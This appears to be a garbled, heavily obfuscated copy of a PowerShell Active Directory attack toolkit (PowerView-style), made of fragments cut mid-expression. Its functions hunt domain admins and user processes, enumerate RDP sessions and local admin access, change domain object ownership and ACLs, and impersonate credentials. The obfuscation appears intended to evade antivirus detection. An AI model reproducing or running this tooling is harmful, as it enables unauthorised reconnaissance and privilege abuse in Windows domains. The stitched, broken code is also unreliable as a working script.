                &(Z3b{2}{1}{0}Z3b-fS5zbjectS5z,S5zw-OS5z,S5zNeS5z) (Z3b{13}{6}{0}{5}{4}{8}{11}{10}{9}{1}{7}{2}{12}{3}Z3b -f S5zDirecS5z,S5zDireS5z,S5ztS5z,S5zuleS5z,S5zoS5z,S5ztS5z,S5zystem.S5z,S5zctoryAudiS5z,S5zrySS5z,S5ztiveS5z,S5zes.AcS5z,S5zervicS5z,S5zRS5z,S5zSS5z) -ArgumentList YoV{IDeIJKNtITy}, YoV{adriGIJKHt}, YoV{AIJKUIJKDitflAg}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]YoV{iNHIJKeRItIJKAnCEIJKTYIJKPE}), YoV{InhEIJKRIJKItEdoBIJKjEcIJKTTIJKype}
            } elseif(YoV{objIJKeCttIJKYIJKpe} -ne YoV{nIJKULl} -and YoV{INIJKHEIJKRItaNIJKCETIJKYpe} -eq   (&(Z3b{1}{2}{0}Z3b -f S5zDITEMS5z,S5zChIS5z,S5zLS5z)  (S5zVaRS5z+S5zIS5z+S5zaBlE:qpu29S5z) ).Z3bvALIJKUEZ3b::Z3bEMIJKptyZ3b -and YoV{INHeIJKRIteDoBjeCtIJKTYIJKPE} -eq YoV{nuIJKLL}) {
                &(Z3b{1}{2}{0}{3}Z3b-fS5zw-ObjeS5z,S5zNS5z,S5zeS5z,S5zctS5z) (Z3b{4}{10}{6}{5}{9}{8}{7}{2}{1}{0','2}{0}Z3b -fS5zrboseS5z,S5zWritS5z,S5ze-VeS5z) (S5z[FiS5z+S5zndS5z+S5z-DomaS5z+S5zinPrS5z+S5zocess]S5z+S5z S5z+S5zDS5z+S5zelay:S5z+S5z S5z+Z3bYoVDelay, Z3b+S5zJitterS5z+S5z: S5z+Z3bYoVJitterZ3b)
            YoV{cOUNIJKTER} = 0
            YoV{raIJKNDIJKNO} = &(Z3b{0}{3}{1}{2}Z3b-f S5zNew-S5z,S5zjecS5z,S5ztS5z,S5zObS5z) (Z3b{3}{2}{0}{1}Z3b -f S5zRaS5z,S5zndomS5z,S5zm.S5z,S5zSysteS5z)

            ForEach (YoV{tIJKAIJKRgeIJKTCoMpIJKUtEr} in YoV{TIJKARIJKGeIJKTcOmputeRS}) {
                YoV{CouIJKNTeR} = YoV{COuIJKNtIJKer} + 1

                
                &(Z3b{1}{2}{0}Z3b-f S5zleepS5z,S5zStS5z,S5zart-SS5z) -Seconds YoV{RaNdIJKNo}.(Z3b{1}{0}Z3b-f S5ztS5z,S5zNexS5z).Invoke((1-YoV{jitIJKTEr})*YoV{DelIJKAY}, (1+YoV{JIJKITter})*YoV{dIJKelaY})

                &(Z3b{0}{1}{3}{2}Z3b -f S5zWS5z,S5zriS5z,S5zerboseS5z,S5zte-VS5z) Z3b[Find-DomainProcess] Enumerating server YoVTargetComputer (YoVCounter of YoV(YoVTargetComputers.count)) Z3b
                YoV{reIJKsuIJKlt} = &(Z3b{0}{4}{2}{1}{3}Z3b-f S5zInS5z,S5zkS5z,S5zoS5z,S5ze-CommandS5z,S5zvS5z) -ScriptBlock YoV{HOsIJKTIJKeNuMBlocK} -ArgumentList YoV{TIJKArGeTIJKCIJKoMPuTer}, YoV{TaIJKRGEIJKTproCIJKeSsIJKNAme}, YoV{TARIJKGEIJKTusIJKErs}, YoV{cIJKRedeIJKNTial}
                YoV{rIJKEsIJKULT}

                if (YoV{RIJKEIJKsULt} -and YoV{STOIJKPIJKoIJKNsuCcESS}) {
                    &(Z3b{2}{0}{3}{1}Z3b-f S5zte-VeS5z,S5zeS5z,S5zWriS5z,S5zrbosS5z) (Z3b{2}{11}{3}{1}{5}{8}{4}{9}{6}{12}{10}{0}{7}Z3b-f S5zeS5z,S5z-DomainPS5z,S5z[S5z,S5zdS5z,S5zss] Target user fouS5z,S5zrS5z,S5z returnS5z,S5zarlyS5z,S5zoceS5z,S5znd,S5z,S5zg S5z,S5zFinS5z,S5zinS5z)
                    return
                }
            }
        }
        else {
            &(Z3b{0}{2}{1}Z3b -f S5zWritS5z,S5zoseS5z,S5ze-VerbS5z) (S5z[FiS5z+S5znd-DoS5z+S5zmaiS5z+S5znPrS5z+S5zocS5z+S5zessS5z+S5z] S5z+S5zUsS5z+S5zing S5z+S5zthrS5z+S5zeadiS5z+S5zng S5z+S5zwitS5z+S5zh S5z+S5zthreadsS5z+S5z:S5z+S5z S5z+Z3bYoVThreadsZ3b)

            
            YoV{sCrIIJKPtPIJKAraIJKms} = @{
                (Z3b{2}{3}{0}{1}Z3b -fS5zaS5z,S5zmeS5z,S5zProcS5z,S5zessNS5z) = YoV{tARGeTPrIJKOcIJKESIJKsIJKNaMe}
                (Z3b{0}{2}{1}Z3b-fS5zTargS5z,S5zrsS5z,S5zetUseS5z) = YoV{taRgIJKetuSIJKERs}
                (Z3b{0}{2}{1}Z3b-fS5zCS5z,S5zlS5z,S5zredentiaS5z) = YoV{crEdIJKEIJKNtIIJKAl}
            }

            
            &(Z3b{4}{0}{2}{3}{1}{5}Z3b -fS5zw-S5z,S5zunctiS5z,S5zThreadedS5z,S5zFS5z,S5zNeS5z,S5zonS5z) -ComputerName YoV{tARgeIJKTcIJKOMPuIJKTEIJKRS} -ScriptBlock YoV{HOsTenIJKUIJKmbloIJKcK} -ScriptParameters YoV{sIJKcRiIJKptIJKpARAIJKMS} -Threads YoV{THIJKRIJKeAdS}
        }
    }
}


function fiIJKNIJKd-DomainuSeREVeIJKNT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{2}{4}{3}{1}Z3b -f S5zPS5z,S5zsS5z,S5zSShS5z,S5zocesS5z,S5zouldPrS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{2}{4}{0}{5}{6}{3}Z3b -fS5zreThanS5z,S5zPSUseDeS5z,S5zclS5z,S5ztsS5z,S5zaredVarsMoS5z,S5zAssigS5z,S5znmenS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{5}{3}{1}{2}{4}{0}Z3b -fS5zeS5z,S5zeS5z,S5zntS5z,S5zSCredS5z,S5zialTypS5z,S5zPSUsePS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{4}{1}{3}{0}{5}{2}{6}Z3b -fS5ztFoS5z,S5zAvoiS5z,S5zasswS5z,S5zdUsingPlainTexS5z,S5zPSS5z,S5zrPS5z,S5zordS5z}, S5zS5z)]
    [OutputType({Z3b{5}{2}{4}{0}{1}{3}Z3b-f S5zw.LS5z,S5zogonEvenS5z,S5zerViS5z,S5ztS5z,S5zeS5z,S5zPowS5z})]
    [OutputType({Z3b{8}{10}{0}{4}{7}{9}{3}{5}{6}{1}{2}Z3b -fS5zVieS5z,S5zalS5z,S5zLogonS5z,S5zeS5z,S5zw.ES5z,S5znS5z,S5ztiS5z,S5zxS5z,S5zPoweS5z,S5zplicitCredS5z,S5zrS5z})]
    [CmdletBinding(dEFAULtParaMETerSetNaMe = {Z3b{1}{0}Z3b -fS5zinS5z,S5zDomaS5z})]
    Param(
        [Parameter(parAMeTERsEtnAmE = Z3bCIJKOmPUTErIJKNIJKAMEZ3b, POSiTIOn = 0, vaLUeFromPiPELInE = YoV{TRIJKUe}, ValuEFROmpIPEliNebYProPeRtynAmE = YoV{TIJKRUe})]
        [Alias({Z3b{2}{0}{1}{3}Z3b-f S5znshostS5z,S5znS5z,S5zdS5z,S5zameS5z}, {Z3b{1}{2}{0}Z3b -fS5zNameS5z,S5zHosS5z,S5ztS5z}, {Z3b{0}{1}Z3b-fS5znamS5z,S5zeS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cOIJKMpuTIJKERnAme},

        [Parameter(PArAMETERsEtNAmE = Z3bdoIJKmaiNZ3b)]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKOMIJKAIn},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        YoV{fILIJKTIJKER},

        [Parameter(VALuEfROmpIPELiNEBYPROpeRTyName = YoV{TIJKRUe})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{StaRIJKTtIJKimE} =   ( &(Z3b{0}{1}Z3b-f S5zVariaBS5z,S5zleS5z)  7dvcIe).Z3bvalIJKUeZ3b::Z3bnIJKowZ3b.(Z3b{1}{0}Z3b -fS5zsS5z,S5zAddDayS5z).Invoke(-1),

        [Parameter(vAluEFROmPiPELIneBYprOpeRtYNAMe = YoV{tRIJKUE})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{eNDTIJKIIJKME} =   (&(Z3b{1}{0}Z3b -fS5zlES5z,S5zvarIabS5z)  (Z3b7DZ3b+Z3bvCiZ3b+Z3beZ3b)).Z3bVAIJKluEZ3b::Z3bnIJKoWZ3b,

        [ValidateRange(1, 1000000)]
        [Int]
        YoV{MIJKAIJKXEIJKVentS} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{uSIJKeIJKRiDEIJKNtiIJKTy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{usEIJKRDIJKOmaiN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{uIJKsEIJKRLdaIJKpFIlteR},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{USEIJKRIJKsEArCHBIJKAIJKse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -f S5zeS5z,S5zNamS5z,S5zGroupS5z}, {Z3b{0}{1}Z3b-f S5zGroS5z,S5zupS5z})]
        [String[]]
        YoV{uSIJKerGIJKROIJKUpiDEnIJKTiTy} = (Z3b{2}{0}{1}Z3b -fS5zmain AS5z,S5zdminsS5z,S5zDoS5z),

        [Alias({Z3b{3}{1}{2}{0}Z3b-fS5ztS5z,S5zdminCoS5z,S5zunS5z,S5zAS5z})]
        [Switch]
        YoV{usIJKeRaIJKDMiNIJKcoIJKUNT},

        [Switch]
        YoV{ChEIJKCKAcIJKcIJKESS},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}{3}Z3b -f S5zDS5z,S5zomaiS5z,S5znContS5z,S5zrollerS5z})]
        [String]
        YoV{sEIJKRVER},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zBaS5z,S5zseS5z}, {Z3b{0}{1}Z3b -fS5zOS5z,S5zneLevelS5z}, {Z3b{2}{1}{0}Z3b-fS5zeeS5z,S5zbtrS5z,S5zSuS5z})]
        [String]
        YoV{SEAIJKRIJKChScoPe} = (Z3b{1}{0}Z3b-fS5ztreeS5z,S5zSubS5z),

        [Validat',', YoV{INhIJKERiTIJKANcIJKeTyPE}, YoV{IIJKNheIJKRITeIJKDOIJKBjECtTypE}
            }

        }
    }
}


function Set-IJKdOIJKmIJKAiIJKNOBjEctOIJKwIJKNEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{6}{4}{0}{8}{7}{10}{5}{1}{11}{9}{2}{3}Z3b -fS5zProceS5z,S5zgS5z,S5zoS5z,S5znsS5z,S5zhouldS5z,S5zanginS5z,S5zPSUseSS5z,S5zsForStS5z,S5zsS5z,S5ziS5z,S5zateChS5z,S5zFunctS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.Su','0}{2}{1}Z3b -f S5zStaS5z,S5zSleepS5z,S5zrt-S5z) -Seconds YoV{RIJKAIJKNdNo}.(Z3b{0}{1}Z3b -f S5zNexS5z,S5ztS5z).Invoke((1-YoV{jITTIJKEr})*YoV{DIJKEIJKLaY}, (1+YoV{JiIJKTTEr})*YoV{DEIJKlIJKAY})

                &(Z3b{1}{0}{3}{2}Z3b -f S5zVS5z,S5zWrite-S5z,S5zoseS5z,S5zerbS5z) Z3b[Find-LocalAdminAccess] Enumerating server YoVTargetComputer (YoVCounter of YoV(YoVTargetComputers.count)) Z3b
                &(Z3b{1}{0}{2}Z3b -fS5znvoke-CS5z,S5zIS5z,S5zommandS5z) -ScriptBlock YoV{hoIJKSIJKTIJKENIJKUMBLoCk} -ArgumentList YoV{TIJKAIJKRgetCOmPIJKUteR}, YoV{LOIJKgonTOIJKKEN}
            }
        }
        else {
            &(Z3b{0}{2}{1}{3}Z3b-fS5zWriS5z,S5zVS5z,S5zte-S5z,S5zerboseS5z) (S5z[Find-LocS5z+S5zalAdS5z+S5zminAS5z+S5zccS5z+S5zesS5z+S5zs] S5z+S5zUsiS5z+S5zng S5z+S5zthreaS5z+S5zdiS5z+S5zng S5z+S5zwiS5z+S5zth S5z+S5zthreaS5z+S5zdS5z+S5zs: S5z+Z3bYoVThreadsZ3b)

            
            YoV{sIJKCIJKRIJKiPIJKTpaRAmS} = @{
                (Z3b{1}{2}{0}{3}Z3b-f S5zandS5z,S5zTokS5z,S5zenHS5z,S5zleS5z) = YoV{LIJKOGoNTOIJKKen}
            }

            
            &(Z3b{4}{2}{0}{1}{3}Z3b-fS5zrS5z,S5zeadeS5z,S5zew-ThS5z,S5zdFunctionS5z,S5zNS5z) -ComputerName YoV{TargEtCIJKomIJKpIJKUIJKTeIJKRs} -ScriptBlock YoV{hIJKosTIJKeIJKNumBLIJKoCk} -ScriptParameters YoV{SIJKCrIJKiptpARaMs} -Threads YoV{ThIJKReaIJKdS}
        }
    }
}


function FiNd-IJKDIJKOMaInlOCIJKALgRoUPMemIJKBer {


    [Dia','b-fS5zl','
                    YoV{NuIJKlL} = YoV{WtIJKSaIJKpIJKi32}::(Z3b{1}{0}{2}{3}Z3b-fS5zeeS5z,S5zW','PS5z,S5zageS5z,S5zSizeS5z)] = YoV{rIJKesIJKULIJKTpaIJKgeSIZe} }
    if (YoV{psboUnIJKDPIJKARIJKAmETEIJKRS}[(Z3b{1}{3}{2}{0}Z3b-fS5zeLimitS5z,S5zServeS5z,S5zmS5z,S5zrTiS5z)]) { YoV{DIJKOMAIIJKNIJKTRuSTargIJKUIJKmeIJKNTS}[(Z3b{1}{2}{3}{0}Z3b -fS5zimitS5z,S5zSS5z,S5zervS5z,S5zerTimeLS5z)] = YoV{ServIJKErTIJKiMIJKELIJKImIt} }
    if (YoV{pSIJKBoUNIJKDpIJKARIJKAmeTers}[(Z3b{2}{1}{0}Z3b-f S5zoneS5z,S5zmbstS5z,S5zToS5z)]) { YoV{DOmIJKAINtIJKRUIJKstIJKARgUMeNTs}[(Z3b{1}{0}Z3b -f S5zombstoneS5z,S5zTS5z)] = YoV{ToIJKmIJKBSIJKTOne} }
    if (YoV{psIJKBOUnIJKDpaRAmeteIJKRS}[(Z3b{0}{2}{1}{3}Z3b-fS5zCredenS5z,S5ziaS5z,S5ztS5z,S5zlS5z)]) { YoV{doMaiIJKNIJKTIJKRIJKUIJKsTIJKARgUmentS}[(Z3b{2}{0}{1}Z3b -f S5zredeS5z,S5zntialS5z,S5zCS5z)] = YoV{CIJKREDIJKENtIAL} }

    
    if (YoV{pIJKsbounIJKdPAramIJKetIJKeRs}[(Z3b{1}{2}{0}Z3b-fS5zntialS5z,S5zCrS5z,S5zedeS5z)]) {
        YoV{cIJKUIJKRrIJKentdoMAIJKIN} = (&(Z3b{1}{0}{2}Z3b -fS5ziS5z,S5zGet-DomaS5z,S5znS5z) -Credential YoV{CRIJKEdEnIJKTiAL}).Z3bnIJKAmEZ3b
    }
    else {
        YoV{cuRrEnIJKTDIJKoMA','5zathS5z})]
        [String]
        YoV{seaIJKRChBIJKAse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{1}{3}{2}{0}Z3b -fS5zrS5z,S5ziS5z,S5ztrolleS5z,S5znConS5z,S5zDomaS5z})]
        [String]
        YoV{SIJKErver},

        [ValidateSet({Z3b{1}{0}Z3b -fS5zaseS5z,S5zBS5z}, {Z3b{0}{1}{2}Z3b -fS5zOneLS5z,S5zeS5z,S5zvelS5z}, {Z3b{0}{1}Z3b -f S5zSubtrS5z,S5zeeS5z})]
        [String]
        YoV{sEAIJKRchIJKsCIJKOPe} = (Z3b{2}{1}{0}Z3b-fS5zeeS5z,S5zbtrS5z,S5zSuS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rIJKESuLTpAGEsIJKIIJKzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sErIJKVErTiIJKmElIJKIIJKMIJKIT},

        [Switch]
        YoV{ToMIJKBSIJKTONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREIJKDIJKentIIJKAl} =  (&(Z3b{1}{0}Z3b -f S5zMS5z,S5zitES5z)  (S5zVaS5z+S5zRIABS5z+S5zLS5z+S5zE:JfIS5z)  ).Z3bvalIJKUeZ3b::Z3beIJKMPtyZ3b
    )

    BEGIN {
        YoV{ComIJKmOnIJKARGUMEIJKNts} = @{}
        if (YoV{PIJKSboUndpArIJKAIJKMeTeIJKRs}[(Z3b{0}{1}Z3b -f S5zDomS5z,S5zainS5z)]) { YoV{commoNaRIJKGuMIJKEIJKNts}[(Z3b{1}{0}Z3b-fS5zinS5z,S5zDomaS5z)] = YoV{dIJKoIJKmAIn} }
        if (YoV{pIJKsBoIJKUnDpaRIJKAmIJKEIJKTeRS}[(Z3b{0}{1}Z3b-f S5zServeS5z,S5zrS5z)]) { YoV{cOMIJKmOnaIJKRGUMIJKeIJKNtS}[(Z3b{1}{2}{0}Z3b-f S5zverS5z,S5zSS5z,S5zerS5z)] = YoV{SeIJKRIJKVEr} }
        if (YoV{psIJKBOUndpArIJKAmeTIJKeRS}[(Z3b{1}{0}{2}{3}Z3b-fS5zScoS5','KAtYpE} -eq 33) {
            
            YoV{dAIJKTa} = YoV( (  &(S5zgIS5z) (Z3bvZ3b+Z3bAriABleZ3b+Z3b:yZ3b+Z3bXZ3b+Z3br2Z3b)  ).Z3bVIJKALUEZ3b::Z3bTOBIJKAsE64IJKStIJKRIIJKNgZ3b(YoV{DnsrIJKEIJKcord}[24..YoV{DnIJKSREIJKCoRD}.Z3bleNgIJKThZ3b]))
            YoV{dNIJKSIJKRIJKeCorDobJIJKeCT} JGO &(Z3b{1}{0}{2}Z3b-f S5zMembS5z,S5zAdd-S5z,S5zerS5z) (Z3b{3}{2}{1}{0}Z3b-fS5zyS5z,S5zropertS5z,S5zpS5z,S5zNoteS5z) (Z3b{1}{2}{0}Z3b -fS5zpeS5z,S5zRecorS5z,S5zdTyS5z) S5zSRVS5z
        }

        else {
            YoV{dIJKATA} = YoV( (&(Z3b{2}{1}{0}Z3b-fS5zblES5z,S5ziAS5z,S5zVaRS5z','beIJKMpTYZ3b,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{DIJKElaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{jIJKiTtIJKEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        YoV{ThrEaIJKds} = 20
    )

    BEGIN {

        YoV{COMPIJKUTEIJKRSEARcIJKHIJKERARgUMENts} = @{
            (Z3b{2}{3}{1}{0}Z3b -f S5zesS5z,S5ztiS5z,S5zProS5z,S5zperS5z) = (Z3b{2}{1}{0}{3}Z3b -f S5ztnS5z,S5zsS5z,S5zdnshoS5z,S5zameS5z)
        }
        if (YoV{PsbOuIJKNDpaIJKRaIJKmEterS}[(Z3b{3}{0}{2}{1}Z3b-fS5zmputeS5z,S5zinS5z,S5zrDomaS5z,S5zCoS5z)]) { YoV{cOMpIJKUTERsearcHeraRIJKGIJKUmeNIJKTs}[(Z3b{1}{2}{0}Z3b -f S5znS5z,S5zDomaS5z,S5ziS5z)] = YoV{cOMPIJKUIJKTIJKErDOMain} }
        if (YoV{pIJKsbIJKOUNdpaRAMeIJKTErs}[(Z3b{1}{4}{0}{2}{3}{5}Z3b-fS5zerS5z,S5zCoS5z,S5zLDAPFiS5z,S5zltS5z,S5zmputS5z,S5zerS5z)]) { YoV{CIJKOmpUIJKTErseARChIJKerIJKARGuIJKmEnTs}[(Z3b{3}{1}{2}{0}Z3b-f S5zterS5z,S5zAPFiS5z,S5zlS5z,S5zLDS5z)] = YoV{cIJKoMpIJKUtErIJKldapfiLter} }
        if (YoV{pSBoundIJKpIJKArAmeIJKTeRS}[(Z3b{0}{1}{2}{3}Z3b -f S5zComS5z,S5zpuS5z,S5zterSearchS5z,S5zBaseS5z)]) { YoV{CoIJKMPIJKUtIJKeRseaRCHERIJKArGUmIJKENTS}[(Z3b{0}{1}{2}Z3b -f S5zSS5z,S5zearchBasS5z,S5zeS5z)] = YoV{comPutIJKEIJKRIJKSIJKEArCIJKHbasE} }
        if (YoV{PSbOuNdpARIJKAIJKMeIJKTERs}[(Z3b{2}{1}{4}{3}{0}Z3b-f S5zedS5z,S5znstrS5z,S5zUncoS5z,S5zinS5z,S5zaS5z)]) { YoV{COIJKMPUteIJKRSearIJKcHEraIJKRgUMEIJKNts}[(Z3b{3}{2}{0}{1}Z3b -fS5znstrS5z,S5zainedS5z,S5zoS5z,S5zUncS5z)] = YoV{uIJKNIJKConSTrIJKAinIJKeD} }
        if (YoV{PIJKsBIJKOIJKUNDPArameTEIJKRS}[(Z3b{3}{1}{6}{4}{0}{2}{5}Z3b -fS5zerOperatS5z,S5zompS5z,S5zingS5z,S5zCS5z,S5ztS5z,S5zSystemS5z,S5zuS5z)]) { YoV{CIJKoMpuTEIJKRsIJKeIJKARcHErarIJKGUmEIJKNTS}[(Z3b{2}{0}{3}{1}Z3b -fS5ztS5z,S5zSystemS5z,S5zOperaS5z,S5zingS5z)] = YoV{oPeRatingIJKSIJKysIJKTEm} }
        if (YoV{PSIJKBoIJKUNdParIJKAMEtIJKERs}[(Z3b{1}{2}{3}{0}Z3b -f S5zPackS5z,S5zCoS5z,S5zmputS5z,S5zerServiceS5z)]) { YoV{CIJKoMPUTErseArcIJKHErIJKAIJKRgIJKUMeNtS}[(Z3b{1}{2}{3}{0}Z3b -f S5zackS5z,S5zServS5z,S5zicS5z,S5zePS5z)] = YoV{SEIJKRvICepIJKAck} }
        if (YoV{PsbOundPaRAMIJKEIJKTIJKeRs}[(Z3b{2}{0}{3}{1}Z3b-f S5zSiteS5z,S5zmeS5z,S5zComputerS5z,S5zNaS5z)]) { YoV{CoIJKmPutErseAIJKRcHeRAIJKRIJKGuMIJKeIJKNtS}[(Z3b{1}{0}{2}Z3b-fS5zamS5z,S5zSiteNS5z,S5zeS5z)] = YoV{sitenIJKAIJKMe} }
        if (YoV{PsBIJKOunDpAraMIJKetIJKeRS}[(Z3b{1}{0}{2}Z3b-f ','
        [Parameter(manDATORY = YoV{tIJKRue}, vALuEFrOMpIPeLINeBYPropErTynAmE = YoV{tRIJKUE}, PARAMeTERSetNAme = Z3bCreAtIJKEIJKVaIJKRIabLESZ3b)]
        [ValidateNotNullOrEmpty()]
        [Vali','S5z+S5zrorS5z+S5z S5z+S5zopeniS5z+S5znS5z+S5zg S5z+S5zrS5z+S5zemoteS5z+S5z S5z+S5zrS5z+S5zegistrS5z+S5zy S5z+S5zonS5z+S5z S5z+Z3bS5zYoVComputerNameS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
            }
        }
    }

    END {
        if (YoV{LogIJKoNTOKIJKEN}) {
            &(Z3b{3}{0}{2}{1}Z3b -f S5zRevertTS5z,S5zlfS5z,S5zoSeS5z,S5zInvoke-S5z) -TokenHandle YoV{lIJKOgontoIJKKIJKen}
        }
    }
}


function get-NeIJKTrDIJKpseSSIIJKON {


    [OutputType({Z3b{4}{0}{7}{6}{1}{2}{3}{5}Z3b-f S5zerVieS5z,S5zDPSS5z,S5zesS5z,S5zsionS5z,S5zPowS5z,S5zInfoS5z,S5z.RS5z,S5zwS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(position = 0, VaLUEFRompIPELIne = YoV{trIJKUe}, vaLUeFrOmPipELiNeByPRopErtyNaME = YoV{trIJKUE})]
        [Alias({Z3b{2}{0}{1}Z3b -fS5zamS5z,S5zeS5z,S5zHostNS5z}, {Z3b{2}{0}{1}Z3b-f S5zshostnamS5z,S5zeS5z,S5zdnS5z}, {Z3b{0}{1}Z3b -f S5znS5z,S5zameS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{ComPIJKUtErnIJKAME} = (Z3b{2}{1}{0}Z3b-fS5ztS5z,S5zlhosS5z,S5zlocaS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CRedIJKENIJKTIJKial} =   (&(Z3b{2}{0}{3}{1}Z3b -f S5ztS5z,S5zLeS5z,S5zgES5z,S5z-variABS5z)  jFI -ValUeOnlY)::Z3bEMIJKptyZ3b
    )

    BEGIN {
        if (YoV{PsIJKBoUNIJKDpArAMeTEIJKRS}[(Z3b{2}{1}{0}Z3b -fS5zlS5z,S5zaS5z,S5zCredentiS5z)]) {
            YoV{LOIJKGIJKonTIJKokEN} = &(Z3b{5}{3}{2}{1}{4}{0}{6}Z3b -f S5ziS5z,S5zsonaS5z,S5zrS5z,S5z-UserImpeS5z,S5ztS5z,S5zInvokeS5z,S5zonS5z) -Credential YoV{CRedeNIJKTIJKiIJKAL}
        }
    }

    PROCESS {
        ForEach (YoV{COmPIJKUIJKTeR} in YoV{CIJKomPIJKUTIJKernamE}) {

            
            YoV{hANIJKDIJKle} = YoV{WtIJKsIJKAIJKPI32}::(Z3b{2}{1}{4}{0}{3}Z3b -fS5zrES5z,S5zSerS5z,S5zWTSOpenS5z,S5zxS5z,S5zveS5z).Invoke(YoV{cIJKomPUTIJKER})

            
            if (YoV{hANIJKDIJKLe} -ne 0) {

                
                YoV{ppIJKSESIJKSIoIJKNIIJKNFO} =  (  &(S5zLsS5z) VAriABle:6RK25P  ).Z3bVAIJKLUeZ3b::Z3bzeIJKRoZ3b
                YoV{pIJKCOUNT} = 0

                
                YoV{reIJKsIJKULt} = YoV{WtIJKSIJKApiIJK32}::Z3bWTIJKSEIJKNIJKUMIJKEraTIJKeSEssiOIJKNsExZ3b(YoV{haIJKNdle}, [ref]1, 0, [ref]YoV{PPSESIJKsiOnIJKInIJKFO}, [ref]YoV{pIJKCoUNT});YoV{LaSIJKTErRIJKOR} =   YoV{np6IJKyr}::(Z3b{4}{2}{3}{1}{0}Z3b -f S5zErrorS5z,S5zn32S5z,S5zLaS5z,S5zstWiS5z,S5zGetS5z','     }
                        }
                        else {
                            YoV{_} JGO &(Z3b{1}{0}{2}Z3b-f S5zemS5z,S5zAdd-MS5z,S5zberS5z) (Z3b{0}{1}{2}{3}Z3b-fS5zNotePropS5z,S5zerS5z,S5ztS5z,S5zyS5z) (Z3b{1}{2}{0}Z3b-fS5zctDNS5z,S5zObS5z,S5zjeS5z) YoV{OIJKBjecT}.Z3bdisIJKTInGuishIJKEDnaIJKmeZ3b[0]
                            YoV{_} JGO &(Z3b{1}{3}{2}{0}Z3b-fS5zrS5z,S5zAS5z,S5zd-MembeS5z,S5zdS5z) (Z3b{3}{1}{0}{2}Z3b-fS5ztePropeS5z,S5zoS5z,S5zrtyS5z,S5zNS5z) (Z3b{1}{0}{2}Z3b -fS5zSIS5z,S5zObjectS5z,S5zDS5z) YoV{ObjeCIJKTIJKsid}
                            YoV{cOIJKNtInIJKUE} = YoV{tRIJKUE}
                        }

                        if (YoV{COIJKNtIJKinUE}) {
                            YoV{_} JGO &(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zembeS5z,S5z','z,S5zFS5z,S5zllS5z).Invoke() }
            else { YoV{rESuIJKlIJKTS} = YoV{SIJKiTEIJKsEArCHER}.(Z3b{2}{0}{1}Z3b-f S5znS5z,S5zdAllS5z,S5zFiS5z).Invoke() }
            YoV{RIJKEIJKsulTs} JGO &(Z3b{0}{2}{1}Z3b-fS5zWhere-S5z,S5zbjectS5z,S5zOS5z) {YoV{_}} JGO &(Z3b{1}{0}{2}{3}Z3b -fS5zbS5z,S5zForEach-OS5z,S5zjS5z,S5zectS5z) {
                if (YoV{PsIJKBIJKOIJKUndPaRAmEIJKTers}[S5zRawS5z]) {
                    
                    YoV{sIJKiTe} = YoV{_}
                }
                else {
                    YoV{SiIJKTe} = &(Z3b{1}{3}{2}{4}{5}{0}Z3b -f S5zPPropertyS5z,S5zConS5z,S5zert-S5z,S5zvS5z,S5zLS5z,S5zDAS5z) -Properties YoV{_}.Z3bpRoIJKpIJKERTIEsZ3b
                }
                YoV{SIIJKTE}.Z3bPSobIJKJEIJKcTZ3b.Z3btypEnaIJKMIJKeSZ3b.(Z3b{1}{0}Z3b-f S5zsertS5z,S5zInS5z).Invoke(0, (Z3b{4}{0}{1}{2}{3}Z3b-fS5zwS5z,S5zerViS5z,S5zeS5z,S5zw.SiteS5z,S5zPoS5z))
                YoV{siIJKTe}
            }
            if (YoV{rEIJKsUIJKlTS}) {
    ','1}{2}Z3b -f S5zvoke-ReS5z,S5zeS5z,S5zlfS5z,S5zInS5z,S5zvertToSS5z) -TokenHandle YoV{LIJKOgIJKONToken}
        }
    }
}


function finIJKdIJK-loIJKCALAdmiIJKNACIJKceSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{4}{0}{1}{3}Z3b-f S5zShoS5z,S5zuldPrS5z,S5zPS5z,S5zocessS5z,S5zSS5z}, S5zS5z)]
    [OutputType([String])]
    Param(
        [Parameter(pOsiTIon = 0, valUEFRoMpIpELiNe = YoV{tIJKRuE}, VALuEfrompipELInEbYpropeRtyNAME = YoV','-f S5zGet-DomS5z,S5znSearcS5z,S5zaiS5z,S5zherS5z) @SearcherArguments
                            if (-not YoV{GPIJKoseIJKAIJKRCHeR}) {
